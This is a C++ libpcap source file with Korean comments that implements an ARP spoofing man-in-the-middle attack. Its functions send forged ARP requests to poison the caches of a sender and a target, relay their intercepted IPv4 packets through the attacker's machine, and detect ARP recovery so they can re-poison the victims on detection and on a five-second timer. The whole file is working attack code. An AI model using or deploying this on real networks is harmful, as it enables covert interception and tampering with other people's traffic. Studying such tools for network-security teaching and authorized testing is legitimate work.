#include <cstdio>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <pcap.h>
#include "etharp.h"
#include <ctime> // 시간 처리를 위한 헤더
#include "ethip.h"

// ARP 요청(감염) 보내는 function
void arpInfect(pcap_t *handle, Mac my_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request); //Reply가 아니라 Request로 감염시킨다.
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

// IP패킷 Relay 해주는 function
void packetRelay(pcap_t *handle, Mac my_mac, Mac sender_mac, Mac target_mac, const char* sender_ip, const char* target_ip)
{
    struct pcap_pkthdr *header;
    const u_char *response;
    
    // Convert sender_ip and target_ip to Ip objects
    Ip senderIp(sender_ip);
    Ip targetIp(target_ip);

    // 패킷 검사
    while (true) {
        int pcap_next_res = pcap_next_ex(handle, &header, &response);
        if (pcap_next_res == 1) {
            EthIpPacket *recv_packet = (EthIpPacket *)response;
            
            // 받은 패킷이 IPv4 패킷인지 확인
            if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4) {
                // 수신된 패킷의 출발지 IP를 Ip 객체로 변환
                Ip srcIp = ntohl(recv_packet->ip_.src_ip_);
                
                // IP 주소가 senderIp나 targetIp와 일치하는지 확인
                if (srcIp == senderIp || srcIp == targetIp) {
                    fprintf(stderr,"I got spoofed packet\n");

                    u_char* packet_copy = new u_char[header->len];
                    memcpy(packet_copy, recv_packet, header->len);

                    // 출발지, 목적지 MAC 주소 변경
                    ((EthIpPacket*)packet_copy)->eth_.smac_ = my_mac;
                    ((EthIpPacket*)packet_copy)->eth_.dmac_ = (srcIp == senderIp) ? target_mac : sender_mac;

                    // 수정된 패킷 전송
                    int res = pcap_sendpacket(handle, packet_copy, header->len);
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                    }

                    delete[] packet_copy;  // 메모리 해제
                }
            }
        }
        
        else if (pcap_next_res == -1) {
            fprintf(stderr, "Error reading the response: %s\n", pcap_geterr(handle));
            break;  // 심각한 오류 시 루프 종료
        } 
        else if (pcap_next_res == -2) {
            fprintf(stderr, "Timeout while reading the response.\n");
            continue;  // 타임아웃 발생 시 루프 재시작
        }
    }
}

// Recovery 상황에서의 ARP Infect function
void recoveryCheck(pcap_t *handle, Mac my_mac, Mac sender_mac, Mac target_mac, const char* sender_ip, const char* target_ip)
{
    struct pcap_pkthdr *header;
    const u_char *response;
    time_t last_infect_time = time(nullptr); // 마지막 감염 시각 초기화
    const int infect_interval = 5; // 재감염 주기 (초 단위)

    while (true) {
        int pcap_next_res = pcap_next_ex(handle, &header, &response);
    
        if (pcap_next_res == 1) {

            EthArpPacket *recv_packet = (EthArpPacket *)response; 
            
            // ARP 패킷 감지
            if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp) {
                bool need_infect = false;

                /* 
                Case1: Sender의 브로드캐스트(ARP Req)
                Case2: Target의 브로드캐스트(ARP Req)
                Case3: Sender의 유니캐스트(ARP Req)
                Case4: Target의 유니캐스트(ARP Req)
                -> 4가지 Case의 공통점은 Arp Req패킷이라는 점과 smac이 sender의 Mac이거나 target의 Mac이라는 것이다.*/

                // Case 1~4: ARP Request 패킷에서 감염 탐지
                if (ntohs(recv_packet->arp_.op_) == ArpHdr::Request &&
                    (recv_packet->eth_.smac_ == sender_mac || recv_packet->eth_.smac_ == target_mac)) {
                    need_infect = true; // 재감염 필요
                }

                // Case 5: ARP Reply 패킷에서 감염 탐지
                if (ntohs(recv_packet->arp_.op_) == ArpHdr::Reply) {
                    // Sender나 Target이 올바른 MAC 주소로 응답하는 경우 감염 풀림
                    if ((recv_packet->arp_.sip_ == Ip(sender_ip) && recv_packet->arp_.smac_ == sender_mac) ||
                        (recv_packet->arp_.sip_ == Ip(target_ip) && recv_packet->arp_.smac_ == target_mac)) {
                        need_infect = true; // 재감염 필요
                    }
                }

                if (need_infect) {
                    fprintf(stderr, "Detect ARP Recovery... ReInfect now!\n");
                    arpInfect(handle, my_mac, sender_mac, sender_ip, target_ip);
                    arpInfect(handle, my_mac, target_mac, target_ip, sender_ip);
                    last_infect_time = time(nullptr); // 마지막 감염 시각 갱신
                }
            }
        }
        else if (pcap_next_res == -1 || pcap_next_res == -2) {
            fprintf(stderr, "Error or Timeout reading the response: %s\n", pcap_geterr(handle));
        }

        // 주기적으로 재감염 수행
        if (difftime(time(nullptr), last_infect_time) > infect_interval) {
            fprintf(stderr, "Periodic ARP ReInfect...\n");
            arpInfect(handle, my_mac, sender_mac, sender_ip, target_ip);
            arpInfect(handle, my_mac, target_mac, target_ip, sender_ip);
            last_infect_time = time(nullptr); // 마지막 감염 시각 갱신
        }
    }     
}